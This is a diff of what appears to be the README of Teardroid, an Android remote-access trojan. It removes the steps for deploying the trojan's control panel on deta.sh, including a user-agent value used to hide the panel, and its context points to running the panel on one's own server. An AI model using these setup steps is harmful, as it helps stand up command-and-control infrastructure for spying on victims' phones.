@@ -53,22 +53,6 @@ OpenJDK 64-Bit Server VM (build 11.0.13+8, mixed mode)
 - Kali linux
 - Ubuntu
 
-### Deploy the Teardroid control panel on deta.sh
-
-- Set up an account at [deta.sh](https://web.deta.sh/)
-- [Click here](https://github.com/ScRiPt1337/Teardroidv4_api/fork) to fork this repo into your github account and click create fork
-- Teardroidv4_api repo will be forked into your account
-- Open the forked repo and click on config.py file and Change the value of "hello" to any user_agent or text you want
-- https://go.deta.dev/deploy?repo=your-repo-url reaplce your-repo-url with the url of your forked repo and open it on browser
-- and click deploy
-- change your user-agent of the browser with the value of USER_AGENT you have enter in config.py
-- you can use this chrome extension to change user useragent [extension](https://chrome.google.com/webstore/detail/custom-useragent-string/lejiafennghcpgmbpiodgofeklkpahoe)
-- DONE
-
-#### Deploy video on deta.sh
-
-!["scatter"](https://external-content.duckduckgo.com/iu/?u=https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/Animation.gif)
-
 ### Run control panel on your own server
 
 - Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below
